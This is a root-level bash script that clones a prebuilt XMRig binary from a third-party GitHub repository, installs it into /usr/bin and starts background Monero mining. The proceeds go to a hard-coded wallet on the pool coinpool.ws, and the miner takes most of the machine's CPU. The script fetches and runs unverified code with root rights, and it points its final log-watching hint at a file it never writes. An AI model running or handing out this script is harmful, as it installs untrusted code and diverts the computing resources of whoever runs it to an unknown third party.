#! /bin/bash
if [ "$(whoami)" != "root" ]; then
        echo -e "\033[0;31mSorry, you are not root. Please use sudo option\033[0m"
        exit 1
fi
WALLET=47XAWjLfyLKcEVZv3aiftRMJoGzBwoYx1is9HxEYSjojH65hyFD7zTmMeEFhFPG7yjEvTjddt2vdLJq2pQcm1Gd5VUACeQg
ID="$(hostname)"
PASSWORD=x
THREADS="$(nproc --all)"

echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
echo -e '\033[0;32m##### Installing updates and install soft...\033[0m'
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake screen htop nano mc -y
sleep 2
rm -rf /tmp/miner
cd /tmp && mkdir miner
git clone https://github.com/loaman123/miner-xmr.git /tmp/miner
cd /tmp/miner
chmod +x /tmp/miner/xmrig
sleep 1
cp /tmp/miner/xmrig /usr/bin/
sleep 1
#xmrig -c /tmp/miner/config.json
xmrig -o coinpool.ws:5555 -u $WALLET.$ID --pass=$PASSWORD --rig-id=$ID --threads=$THREADS -B -l /tmp/miner/coinpool.log --donate-level=1 --cpu-priority=5 --max-cpu-usage=80 --print-time=10 --variant=1 -k 
echo -e '\033[0;32m##### Miner started \033[0m'
echo -e '\033[0;32m##### Watch: \033[0m'
echo -e '\033[0;32m##### tail -f /tmp/miner/qrl.log \033[0m'
